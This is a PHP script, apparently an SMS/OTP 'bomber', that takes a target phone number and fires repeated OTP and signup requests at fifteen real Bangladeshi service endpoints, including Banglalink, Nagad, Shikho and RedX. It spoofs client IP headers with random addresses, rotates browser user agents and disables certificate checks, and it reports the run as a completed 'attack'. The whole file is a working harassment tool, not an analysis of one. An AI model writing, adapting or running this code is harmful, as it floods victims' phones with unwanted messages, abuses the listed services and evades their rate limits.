<?php
header('Content-Type: application/json');
error_reporting(0);
ini_set('display_errors', 0);

// স্ক্রিপ্ট যেন লম্বা সময় ধরে রান হতে পারে তার জন্য টাইমআউট বাড়িয়ে দেওয়া হলো
set_time_limit(300);
ini_set('max_execution_time', '300');

function randomIp() {
    return rand(1,255).'.'.rand(0,255).'.'.rand(0,255).'.'.rand(1,255);
}

// এককভাবে একটি একটি করে রিকোয়েস্ট পাঠানোর ফাংশন
function sendSingleRequest($req) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $req['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if (isset($req['method']) && $req['method'] === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if (isset($req['data'])) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $req['data']);
        }
    }
    
    $headers = array_merge([
        'User-Agent: ' . $req['ua'],
        'X-Forwarded-For: ' . randomIp(),
        'X-Real-IP: ' . randomIp(),
        'Client-IP: ' . randomIp()
    ], isset($req['headers']) ? $req['headers'] : []);
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // HTTP কোড 200 থেকে 399 এর মধ্যে হলে সফল ধরবে
    return ($http >= 200 && $http < 400);
}

$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
];

$apis = [];

// আপনার এপিআই লিস্ট এখানে যুক্ত আছে
$apis[] = ['url' => 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 'method' => 'POST', 'data' => json_encode(['full_name'=>'BILLAVAI','company_name'=>'HARDBOMBER','email_address'=>'pro@bomb.bd','phone_number'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', 'method' => 'POST', 'data' => json_encode(['mobile_no'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 'method' => 'POST', 'data' => json_encode(['data'=>['country_calling_code'=>'88','contact_no'=>'{{number}}','headers'=>['PlatForm'=>'Web']]]), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.apex4u.com/api/auth/login', 'method' => 'POST', 'data' => json_encode(['phoneNumber'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://web-api.banglalink.net/api/v1/user/number/validation/{{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://web-api.banglalink.net/api/v1/user/otp-login/request', 'method' => 'POST', 'data' => json_encode(['mobile'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'method' => 'POST', 'data' => json_encode(['phoneNumber'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://fundesh.com.bd/api/auth/generateOTP', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://api.motionview.com.bd/api/send-otp-phone-signup', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.shikho.com/auth/v2/send/sms', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','type'=>'student','auth_type'=>'signup']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.ostad.app/api/v2/user/with-otp', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://www.ieducationbd.com/api/account/check_user', 'method' => 'POST', 'data' => json_encode(['mobile'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.nagad.com.bd/otp/send', 'method' => 'POST', 'data' => json_encode(['mobileNumber'=>'{{number}}','service'=>'login']), 'headers' => ['Content-Type: application/json']];

$number = isset($_REQUEST['number']) ? preg_replace('/[^0-9]/', '', $_REQUEST['number']) : '';
$amount = isset($_REQUEST['amount']) ? intval($_REQUEST['amount']) : 1;

if ($amount < 1) $amount = 1;
if ($amount > 5) $amount = 5; // সিকিউরিটির জন্য অ্যামাউন্ট লিমিট ৫ রাখা হয়েছে

if (strlen($number) !== 11) {
    echo json_encode(['error' => 'Invalid phone number. Must be 11 digits.'], JSON_PRETTY_PRINT);
    exit;
}

$totalRequests = 0;
$successCount = 0;
$failCount = 0;

// লুপ চালিয়ে একটি একটি করে রিকোয়েস্ট পাঠানো হচ্ছে
for ($cycle = 1; $cycle <= $amount; $cycle++) {
    foreach ($apis as $api) {
        $req = $api;
        $req['url'] = str_replace('{{number}}', $number, $req['url']);
        if (isset($req['data'])) {
            $req['data'] = str_replace('{{number}}', $number, $req['data']);
        }
        $req['ua'] = $userAgents[array_rand($userAgents)];
        
        $totalRequests++;
        $isSuccess = sendSingleRequest($req);
        
        if ($isSuccess) {
            $successCount++;
        } else {
            $failCount++;
        }
    }
}

$response = [
    'Api_Owner' => 'billa',
    'target_number' => $number,
    'amount' => $amount,
    'total_requests' => $totalRequests,
    'success' => $successCount,
    'failed' => $failCount,
    'message' => 'Sequential attack completed successfully.'
];
echo json_encode($response, JSON_PRETTY_PRINT);
?>
